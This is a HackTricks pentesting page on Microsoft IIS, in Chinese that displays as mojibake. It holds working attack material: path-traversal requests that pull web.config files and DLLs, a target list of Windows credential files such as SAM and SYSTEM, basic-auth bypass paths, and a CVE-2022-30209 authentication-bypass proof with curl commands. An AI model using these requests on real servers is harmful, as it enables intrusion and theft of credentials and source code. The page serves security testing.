# IIS - äº’è”ç½‘ä¿¡æ¯æœåŠ¡

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä»¥PDFæ ¼å¼ä¸‹è½½HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

æµ‹è¯•å¯æ‰§è¡Œæ–‡ä»¶æ‰©å±•åï¼š

* asp
* aspx
* config
* php

## å†…éƒ¨IPåœ°å€æ³„éœ²

åœ¨ä»»ä½•IISæœåŠ¡å™¨ä¸Šï¼Œå½“æ‚¨å¾—åˆ°302å“åº”æ—¶ï¼Œæ‚¨å¯ä»¥å°è¯•å»æ‰Hostå¤´éƒ¨å¹¶ä½¿ç”¨HTTP/1.0ï¼Œåœ¨å“åº”ä¸­Locationå¤´éƒ¨å¯èƒ½ä¼šæŒ‡å‘å†…éƒ¨IPåœ°å€ï¼š
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
å“åº”æ³„éœ²å†…éƒ¨IPï¼š
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## æ‰§è¡Œ .config æ–‡ä»¶

æ‚¨å¯ä»¥ä¸Šä¼  .config æ–‡ä»¶å¹¶ä½¿ç”¨å®ƒä»¬æ¥æ‰§è¡Œä»£ç ã€‚ä¸€ç§æ–¹æ³•æ˜¯åœ¨æ–‡ä»¶æœ«å°¾çš„ HTML æ³¨é‡Šä¸­é™„åŠ ä»£ç ï¼š[åœ¨æ­¤ä¸‹è½½ç¤ºä¾‹](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

æœ‰å…³åˆ©ç”¨æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯å’ŒæŠ€æœ¯[åœ¨æ­¤](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS å‘ç°æš´åŠ›ç ´è§£

ä¸‹è½½æˆ‘åˆ›å»ºçš„åˆ—è¡¨ï¼š

{% file src="../../.gitbook/assets/iisfinal.txt" %}

å®ƒæ˜¯é€šè¿‡åˆå¹¶ä»¥ä¸‹åˆ—è¡¨çš„å†…å®¹åˆ›å»ºçš„ï¼š

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

ä½¿ç”¨æ—¶ä¸è¦æ·»åŠ ä»»ä½•æ‰©å±•åï¼Œéœ€è¦æ‰©å±•åçš„æ–‡ä»¶å·²ç»åŒ…å«äº†ã€‚

## è·¯å¾„éå†

### æ³„éœ²æºä»£ç 

{% hint style="info" %}
æ€»ç»“æ¥è¯´ï¼Œåº”ç”¨ç¨‹åºçš„æ–‡ä»¶å¤¹ä¸­æœ‰å‡ ä¸ª web.config æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯¹â€œ**assemblyIdentity**â€æ–‡ä»¶å’Œâ€œ**namespaces**â€çš„å¼•ç”¨ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œå°±å¯ä»¥çŸ¥é“**å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®**å¹¶ä¸‹è½½å®ƒä»¬ã€‚\
ä»**ä¸‹è½½çš„ Dlls** ä¸­ï¼Œä¹Ÿå¯ä»¥æ‰¾åˆ°**æ–°çš„å‘½åç©ºé—´**ï¼Œæ‚¨åº”è¯¥å°è¯•è®¿é—®å¹¶è·å– web.config æ–‡ä»¶ï¼Œä»¥ä¾¿æ‰¾åˆ°æ–°çš„å‘½åç©ºé—´å’Œ assemblyIdentityã€‚\
æ­¤å¤–ï¼Œæ–‡ä»¶ **connectionstrings.config** å’Œ **global.asax** å¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ã€‚\
å‚è€ƒï¼š[https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)
{% endhint %}

åƒä»»ä½• .Net åº”ç”¨ç¨‹åºä¸€æ ·ï¼ŒMVC åº”ç”¨ç¨‹åºæœ‰ä¸€ä¸ª **web.config** æ–‡ä»¶ï¼Œå…¶ä¸­â€œ**assemblyIdentity**â€ XML æ ‡ç­¾æ ‡è¯†åº”ç”¨ç¨‹åºä½¿ç”¨çš„æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0" encoding="utf-8"?>
<configuration>
<configSections>
<section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral" requirePermission="false" />
</configSections>
<appSettings>
<add key="webpages:Version" value="3.0.0.0" />
<add key="webpages:Enabled" value="false" />
<add key="ClientValidationEnabled" value="true" />
<add key="UnobtrusiveJavaScriptEnabled" value="true" />
</appSettings>
<system.web>
<authentication mode="None" />
<compilation debug="true" targetFramework="4.6.1" />
<httpRuntime targetFramework="4.6.1" />
</system.web>
<system.webServer>
<modules>
<remove name="FormsAuthentication" />
</modules>
</system.webServer>
<runtime>
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security.OAuth" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin.Security.Cookies" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Microsoft.Owin" />
<bindingRedirect oldVersion="1.0.0.0-3.0.1.0" newVersion="3.0.1.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="Newtonsoft.Json" culture="neutral" />
<bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Optimization" />
<bindingRedirect oldVersion="1.0.0.0-1.1.0.0" newVersion="1.1.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="WebGrease" />
<bindingRedirect oldVersion="0.0.0.0-1.5.2.14234" newVersion="1.5.2.14234" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Helpers" />
<bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.Mvc" />
<bindingRedirect oldVersion="1.0.0.0-5.2.3.0" newVersion="5.2.3.0" />
</dependentAssembly>
<dependentAssembly>
<assemblyIdentity name="System.Web.WebPages" />
<bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
</dependentAssembly>
</assemblyBinding>
```
åœ¨å‰é¢çš„è¾“å‡ºä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å‡ ä¸ªâ€œ**assemblyIdentity**â€ã€‚è¿™äº›å¯èƒ½æ˜¯ä½äº /bin æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼š**/bin/WebGrease.dllã€‚**

åœ¨ .Net åº”ç”¨ç¨‹åºçš„æ ¹ç›®å½•ä¸­å¯èƒ½æ‰¾åˆ°çš„å…¶ä»–æ–‡ä»¶æ˜¯ **/global.asax**
```markup
<%@ Application Codebehind="Global.asax.cs" Inherits="WebApplication1.MvcApplication" Language="C#" %>
```
```markdown
å’Œ **/connectionstrings.config**

**æ³¨æ„ï¼šæ­¤æ–‡ä»¶åŒ…å«å¯†ç ï¼**
```
```markup
<connectionStrings>
<add name="DefaultConnection" connectionString="Data Source=(LocalDb)\MSSQLLocalDB;AttachDbFilename [...]" providerName="System.Data.SqlClient" />
</connectionStrings>
```
**å‘½åç©ºé—´**

æ­¤å¤–ï¼Œ.Net MVC åº”ç”¨ç¨‹åºçš„ç»“æ„æ—¨åœ¨å®šä¹‰**å…¶ä»– web.config æ–‡ä»¶**ï¼Œç›®çš„æ˜¯åŒ…å«æ¯ç»„è§†å›¾é¡µé¢ç‰¹å®šå‘½åç©ºé—´çš„å£°æ˜ï¼Œå…é™¤å¼€å‘äººå‘˜åœ¨æ¯ä¸ªæ–‡ä»¶ä¸­å£°æ˜â€œ@usingâ€å‘½åç©ºé—´çš„è´Ÿæ‹…ã€‚
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0"?>
<configuration>
<configSections>
<sectionGroup name="system.web.webPages.razor" type="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">
<section name="host" type="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
<section name="pages" type="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
</sectionGroup>
</configSections>
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" /><pages pageBaseType="System.Web.Mvc.WebViewPage">
<namespaces>
<add namespace="System.Web.Mvc" />
<add namespace="System.Web.Mvc.Ajax" />
<add namespace="System.Web.Mvc.Html" />
<add namespace="System.Web.Optimization"/>
<add namespace="System.Web.Routing" />
<add namespace="WebApplication1" />
```
**ä¸‹è½½ DLLs**

ä»ä¸€ä¸ªå¾ˆæ—©ä¹‹å‰çš„å“åº”ä¸­ï¼Œå£°æ˜äº†ä¸€ä¸ª**è‡ªå®šä¹‰å‘½åç©ºé—´**ï¼ˆå› ä¸ºå…¶ä»–å‘½åç©ºé—´æ˜¯é»˜è®¤çš„ï¼‰è¡¨æ˜åœ¨ /bin ç›®å½•ä¸­å­˜åœ¨ä¸€ä¸ªåä¸ºâ€œ**WebApplication1**â€çš„ DLLã€‚
```
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
[...]
```
ä»å‰é¢çš„è¾“å‡ºä¸­ï¼Œåœ¨/binç›®å½•å†…ï¼Œä½ è¿˜èƒ½æ‰¾åˆ°ä»¥ä¸‹Dlls

* System.Web.Mvc.dll
* System.Web.Mvc.Ajax.dll
* System.Web.Mvc.Html.dll
* System.Web.Optimization.dll
* System.Web.Routing.dll

å‡è®¾å‰é¢çš„DLLæ­£åœ¨å¯¼å…¥ä¸€ä¸ªåä¸º **WebApplication1.Areas.Minded.** çš„å‘½åç©ºé—´ã€‚æ”»å‡»è€…å¯ä»¥æ¨æ–­ï¼Œåº”ç”¨ç¨‹åºä¸­å­˜åœ¨å…¶ä»–çš„web.configæ–‡ä»¶ï¼Œå®ƒä»¬ä½äºå¯é¢„æµ‹çš„/é»˜è®¤è·¯å¾„ **/area-name/Views/**ï¼ŒåŒ…å«å¯èƒ½å¼•ç”¨/binæ–‡ä»¶å¤¹ä¸­å…¶ä»–DLLæ–‡ä»¶çš„ç‰¹å®šé…ç½®ã€‚
```markup
GET /download_page?id=..%2f..%2fMinded/Views/web.config HTTP/1.1
Host: example-mvc-application.minded
[...]

HTTP/1.1 200 OK
[...]
<?xml version="1.0"?>
<configuration>
<configSections>
<sectionGroup name="system.web.webPages.razor" type="System.Web.WebPages.Razor.Configuration.RazorWebSectionGroup, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral">
<section name="host" type="System.Web.WebPages.Razor.Configuration.HostSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutral" requirePermission="false" />
<section name="pages" type="System.Web.WebPages.Razor.Configuration.RazorPagesSection, System.Web.WebPages.Razor, Version=3.0.0.0, Culture=neutralâ€ requirePermission="false" />
</sectionGroup>
</configSections>
<system.web.webPages.razor><host factoryType="System.Web.Mvc.MvcWebRazorHostFactory, System.Web.Mvc, Version=5.2.3.0, Culture=neutral" />
<pages pageBaseType="System.Web.Mvc.WebViewPage">
<namespaces>
<add namespace="System.Web.Mvc" />
<add namespace="System.Web.Mvc.Ajax" />
<add namespace="System.Web.Mvc.Html" />
<add namespace="System.Web.Routing" />
<add namespace="System.Web.Optimization" />
<add namespace="WebApplication1" />
<add namespace="WebApplication1.AdditionalFeatures" />
</namespaces>
```
æ³¨æ„ï¼Œåœ¨å‰é¢çš„è¾“å‡ºä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ä¸€ä¸ªåä¸º **WebApplication1.AdditionalFeatures** çš„æ–°å‘½åç©ºé—´ï¼Œè¿™è¡¨æ˜åœ¨ /bin æ–‡ä»¶å¤¹ä¸­è¿˜æœ‰ä¸€ä¸ªåä¸º **WebApplication1.AdditionalFeatures.dll** çš„ Dll

### å¸¸è§æ–‡ä»¶

ä»[è¿™é‡Œ](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 é”™è¯¯

å¦‚æœä½ çœ‹åˆ°å¦‚ä¸‹é”™è¯¯ï¼š

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (13).png>)

è¿™æ„å‘³ç€æœåŠ¡å™¨**æ²¡æœ‰åœ¨ Host å¤´ä¸­æ¥æ”¶åˆ°æ­£ç¡®çš„åŸŸå**ã€‚\
ä¸ºäº†è®¿é—®ç½‘é¡µï¼Œä½ å¯ä»¥æŸ¥çœ‹æä¾›çš„**SSL è¯ä¹¦**ï¼Œä¹Ÿè®¸ä½ å¯ä»¥åœ¨é‚£é‡Œæ‰¾åˆ°åŸŸå/å­åŸŸåã€‚å¦‚æœæ²¡æœ‰ï¼Œä½ å¯èƒ½éœ€è¦**æš´åŠ›ç ´è§£ VHosts**ç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„ä¸€ä¸ªã€‚

## å€¼å¾—å¯»æ‰¾çš„æ—§ IIS æ¼æ´

### Microsoft IIS æ³¢æµªå· â€œ\~â€ æ¼æ´/ç‰¹æ€§ â€“ çŸ­æ–‡ä»¶/æ–‡ä»¶å¤¹åæ³„éœ²

ä½ å¯ä»¥å°è¯•ä½¿ç”¨è¿™ä¸ª**æŠ€æœ¯**åœ¨æ¯ä¸ªå‘ç°çš„æ–‡ä»¶å¤¹ä¸­ï¼ˆå³ä½¿å®ƒéœ€è¦åŸºæœ¬è®¤è¯ï¼‰**æšä¸¾æ–‡ä»¶å¤¹å’Œæ–‡ä»¶**ã€‚\
å¦‚æœæœåŠ¡å™¨æ˜“å—æ”»å‡»ï¼Œè¿™é¡¹æŠ€æœ¯çš„ä¸»è¦é™åˆ¶æ˜¯**å®ƒåªèƒ½æ‰¾åˆ°æ¯ä¸ªæ–‡ä»¶/æ–‡ä»¶å¤¹åç§°çš„å‰ 6 ä¸ªå­—æ¯å’Œæ–‡ä»¶æ‰©å±•åçš„å‰ 3 ä¸ªå­—æ¯**ã€‚

ä½ å¯ä»¥ä½¿ç”¨ [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) æ¥æµ‹è¯•è¿™ä¸ªæ¼æ´ï¼š`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (183).png>)

åŸå§‹ç ”ç©¶ï¼š[https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ **metasploit**ï¼š`use scanner/http/iis_shortname_scanner`

### åŸºæœ¬è®¤è¯ç»•è¿‡

å°è¯•ç»•è¿‡åŸºæœ¬è®¤è¯ï¼ˆ**IIS 7.5**ï¼‰è®¿é—®ï¼š`/admin:$i30:$INDEX_ALLOCATION/admin.php` æˆ– `/admin::$INDEX_ALLOCATION/admin.php`

ä½ å¯ä»¥å°è¯•**æ··åˆ**è¿™ä¸ª**æ¼æ´**å’Œä¸Šä¸€ä¸ªæ¥æ‰¾åˆ°æ–°çš„**æ–‡ä»¶å¤¹**å¹¶**ç»•è¿‡**è®¤è¯ã€‚

## ASP.NET Trace.AXD å¯ç”¨è°ƒè¯•

ASP.NET åŒ…å«ä¸€ä¸ªè°ƒè¯•æ¨¡å¼ï¼Œå…¶æ–‡ä»¶åä¸º `trace.axd`ã€‚

å®ƒä¿ç•™äº†ä¸€æ®µæ—¶é—´å†…å¯¹åº”ç”¨ç¨‹åºæ‰€åšçš„æ‰€æœ‰è¯·æ±‚çš„éå¸¸è¯¦ç»†çš„æ—¥å¿—ã€‚

è¿™äº›ä¿¡æ¯åŒ…æ‹¬è¿œç¨‹å®¢æˆ·ç«¯ IPã€ä¼šè¯ IDã€æ‰€æœ‰è¯·æ±‚å’Œå“åº”çš„ cookiesã€ç‰©ç†è·¯å¾„ã€æºä»£ç ä¿¡æ¯ï¼Œç”šè‡³å¯èƒ½åŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç ã€‚

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH ä½¿ç”¨ä»¥ä¸‹ä¿¡æ¯ï¼š

* **`validationKey`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šç”¨äºç­¾åéªŒè¯çš„åå…­è¿›åˆ¶ç¼–ç å¯†é’¥ã€‚
* **`decryptionMethod`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šï¼ˆé»˜è®¤ä¸º â€œAESâ€ï¼‰ã€‚
* **`decryptionIV`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šåå…­è¿›åˆ¶ç¼–ç çš„åˆå§‹åŒ–å‘é‡ï¼ˆé»˜è®¤ä¸ºé›¶å‘é‡ï¼‰ã€‚
* **`decryptionKey`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šç”¨äºè§£å¯†çš„åå…­è¿›åˆ¶ç¼–ç å¯†é’¥ã€‚

ç„¶è€Œï¼Œæœ‰äº›äººä¼šä½¿ç”¨è¿™äº›å‚æ•°çš„**é»˜è®¤å€¼**ï¼Œå¹¶å°†**ç”¨æˆ·çš„ç”µå­é‚®ä»¶ä½œä¸º cookie**ã€‚å› æ­¤ï¼Œå¦‚æœä½ èƒ½æ‰¾åˆ°ä½¿ç”¨ ASPXAUTH cookie å¹¶ä¸”ä½¿ç”¨**ç›¸åŒå¹³å°**çš„ç½‘ç«™ï¼Œå¹¶ä¸”ä½ åœ¨å—æ”»å‡»çš„æœåŠ¡å™¨ä¸Š**åˆ›å»ºä¸€ä¸ªä½¿ç”¨ä½ æƒ³è¦å†’å……çš„ç”¨æˆ·ç”µå­é‚®ä»¶çš„ç”¨æˆ·**ï¼Œä½ å¯èƒ½èƒ½å¤Ÿ**ä½¿ç”¨ç¬¬äºŒä¸ªæœåŠ¡å™¨ä¸Šçš„ cookie åœ¨ç¬¬ä¸€ä¸ªæœåŠ¡å™¨ä¸Š**å¹¶å†’å……è¯¥ç”¨æˆ·ã€‚\
è¿™ç§æ”»å‡»åœ¨è¿™ä¸ª[**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)ä¸­èµ·ä½œç”¨ã€‚

## IIS è®¤è¯ç»•è¿‡ä¸ç¼“å­˜å¯†ç  (CVE-2022-30209) <a href="#3-iis-authentication-bypass" id="3-iis-authentication-bypass"></a>

ä»£ç ä¸­çš„ä¸€ä¸ªé”™è¯¯**æ²¡æœ‰æ­£ç¡®æ£€æŸ¥ç”¨æˆ·æä¾›çš„å¯†ç **ï¼Œå› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…çš„**å¯†ç å“ˆå¸Œç¢°å·§æ˜¯å·²ç»åœ¨ç¼“å­˜ä¸­çš„å¯†é’¥**ï¼Œä»–å°†èƒ½å¤Ÿä½œä¸ºè¯¥ç”¨æˆ·ç™»å½•ï¼ˆ[å®Œæ•´æŠ¥å‘Šåœ¨è¿™é‡Œ](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)ï¼‰ã€‚
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹çš„PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
